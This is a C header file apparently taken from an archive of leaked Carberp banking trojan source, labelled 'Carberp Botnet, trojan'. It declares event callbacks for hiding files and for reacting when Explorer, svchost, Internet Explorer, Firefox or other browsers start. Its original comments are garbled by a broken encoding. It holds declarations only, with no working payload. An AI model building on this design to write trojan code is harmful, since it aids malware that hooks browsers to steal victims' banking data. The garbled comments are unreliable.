/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

/*
	� ������ ������� �������� �������, ������� ����� ��������� � ����.

*/

#ifndef BotEventsH
#define BotEventsH

#include <windows.h>

// ������ �������
typedef struct TEventData
{
    PCHAR Application;  // ���������� ��������� �������
	bool Cancel;        // �������� ���������� ��������� �������

} *PEventData;



//-----------------------------------------------------------
//  InitializeHiddenFiles - ������� �������������� ������
//                          ������ ����� ������� ��� �����
//                          �������
//-----------------------------------------------------------
void InitializeHiddenFiles();



// ������ ������ ���� � ����������
void ExplorerFirstStart(PEventData Data);

// ������� ����������
void ExplorerStart(PEventData Data);

// �������� ������� ���������� � �������� svchost
void SVChostStart(PEventData Data, bool &Cancel);

// ������� Internet Explorer. ��������� ����� ������� � ������� ��������
void InternetExplorerStarted(PEventData Data);

// ������� �������. ��������� ����� ������� � ������� ��������
void FireFoxStarted(PEventData Data);

// ������� ��������� �������. ��������� ����� ������� � ������� ��������
void BrowserStarted(PEventData Data);

// �������� ����������� ����������
void ApplicationStarted(PEventData Data);


//---------------------------------------------------------------------------
#endif
